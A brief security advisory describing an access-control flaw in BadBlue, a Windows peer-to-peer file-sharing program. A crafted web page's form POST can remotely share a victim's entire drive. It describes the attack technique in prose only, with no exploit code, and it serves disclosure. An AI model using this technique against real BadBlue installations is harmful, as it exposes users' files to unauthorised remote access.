BadBlue is a P2P file sharing application distributed by Working Resources. It is available for Microsoft Windows operating systems.

BadBlue does not sufficiently control access to the administrative interface. It is possible to remotely add the entire drive of a system running a vulnerable BadBlue implementation via a maliciously crafted web page containing a form POST method. This would allow remote users to via the contents of the drive with the privileges of the BadBlue server.
